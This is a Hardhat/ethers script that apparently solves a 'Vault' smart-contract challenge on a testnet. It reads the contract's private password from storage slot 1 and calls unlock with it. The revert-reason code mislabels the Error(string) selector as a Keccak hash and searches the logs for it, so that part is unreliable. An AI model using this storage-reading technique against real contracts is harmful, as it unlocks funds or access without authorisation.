require("dotenv").config()
const {
  abi: ABIVault,
} = require("../../artifacts/contracts/8/Vault.sol/Vault.json")
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* DEPLOY + ATTACK */
async function main() {
  /* CONTRACT NAME */
  const contractAddressToHack = "0xED2152434685558B0dDe2AE4a499A874A8cdB540"

  const pass = await provider.getStorageAt(contractAddressToHack, 1) // provider.getStorageAt(ADDRESS, SLOT)
  console.log("pass", pass)

  /* delegation instance */
  const VaultContract = new ethers.Contract(
    contractAddressToHack,
    ABIVault,
    provider
  )

  const tx = await VaultContract.connect(signer).unlock(pass)
  const res = await tx.wait()
  if (res.status === 0) {
    console.log("Transaction failed")

    // Retrieve the revert reason from the res if available
    if (res.logs && res.logs.length > 0) {
      const errorLog = res.logs.find((log) => log.topics[0] === "0x08c379a0") // Keccak hash of "Error(string)"
      if (errorLog) {
        const errorData = errorLog.data
        const reason = ethers.utils.toUtf8String(errorData.slice(4)) // Removing the 4-byte selector
        console.log("Revert reason:", reason)
      }
    }
  } else if (res.status === 1) {
    console.log("Transaction succeeded")
  }
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/8/DeployAndCall__Attack.js --network mumbai
*/
